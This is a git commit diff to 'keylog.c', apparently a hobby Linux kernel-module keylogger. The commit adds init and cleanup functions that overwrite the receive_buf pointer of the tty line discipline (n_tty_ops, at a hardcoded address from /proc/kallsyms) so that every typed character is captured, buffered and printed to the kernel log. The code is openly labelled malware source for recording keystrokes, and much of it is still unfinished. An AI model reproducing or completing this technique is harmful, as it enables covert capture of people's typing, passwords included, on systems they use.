8fd213e83f8ee2ec45095e7397a14ee52329f7b9
HiDoYa <hiroyagojo@gmail.com>
2020-05-19 14:48:38 -0700

    Added necessary fns for kernel module and changed addr for tty_ldisc_ops

--- Source/keylog.c
+++ Source/keylog.c
@@ -1,12 +1,11 @@
 // Keylogger
-// TODO: Adapt for ubuntu 20.04. No longer has receive_buf function? Need to find replacement. Find another function to hijack
 
 // TODO
 #define BACKSPACE_KEY 0
 #define ENTER_KEY 0
 
-// TODO: Create module init for LKM
-
+#include <linux/module.h>
+#include <linux/kernel.h>
 #include <linux/types.h>
 #include <linux/kref.h>
 #include <linux/fs.h>
@@ -28,7 +27,8 @@ static struct line_buf key_buf;
 
 static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {
-	// Check if there is nothing to log (TODO: TTY changed for 20.04. Find equivalent flags)
+	// Check if there is nothing to log 
+	// TODO: TTY changed for 20.04. Find equivalent flags
 	// if (!tty->read_buf || tty->real_raw) {
 	// 	return;
 	// }
@@ -36,7 +36,7 @@ static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 	// Log data in key buffer
 	if (count == 1) {
 		if (*cp == BACKSPACE_KEY) {
-		key_buf.line[--key_buf.pos] = 0;
+			key_buf.line[--key_buf.pos] = 0;
 		} else if (*cp == ENTER_KEY) {
 			key_buf.line[key_buf.pos++] = '\n';
 		} else {
@@ -44,6 +44,7 @@ static void log_keys(struct tty_struct *tty, const unsigned char *cp, char *fp, 
 		}
 	}
 
+	printk(KERN_INFO "New Character: %c\n", *cp);
 }
 
 static void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
@@ -54,7 +55,11 @@ static void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, cha
 
 static void hijack_tty_ldisc_receive_buf(void)
 {
-	our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xc0787dc0;
+	// tty_ldisc_N_TTY is deprecated and replaced by n_tty_ops
+	// Source: https://lore.kernel.org/patchwork/patch/634134/
+	// n_tty_ops is the struct containing receive_buf fn
+	// Address of n_tty_ops (type struct tty_ldisc_ops) is available via /proc/kallsyms
+	our_tty_ldisc_N_TTY = (struct tty_ldisc_ops *) 0xffffffffba5700c0;
 	original_receive_buf = our_tty_ldisc_N_TTY->receive_buf;
 	our_tty_ldisc_N_TTY->receive_buf = new_receive_buf;
 }
@@ -62,4 +67,19 @@ static void hijack_tty_ldisc_receive_buf(void)
 static void unhijack_tty_ldisc_receive_buf(void)
 {
 	our_tty_ldisc_N_TTY->receive_buf = original_receive_buf;
+}
+
+int init_module(void)
+{
+	printk(KERN_INFO "Loading keylogger\n");
+	hijack_tty_ldisc_receive_buf();
+	printk(KERN_INFO "Finished loading keylogger\n");
+	return 0;
+}
+
+void cleanup_module(void)
+{
+	printk(KERN_INFO "Unloading keylogger\n");
+	unhijack_tty_ldisc_receive_buf();
+	printk(KERN_INFO "Finished unloading keylogger\n");
 }
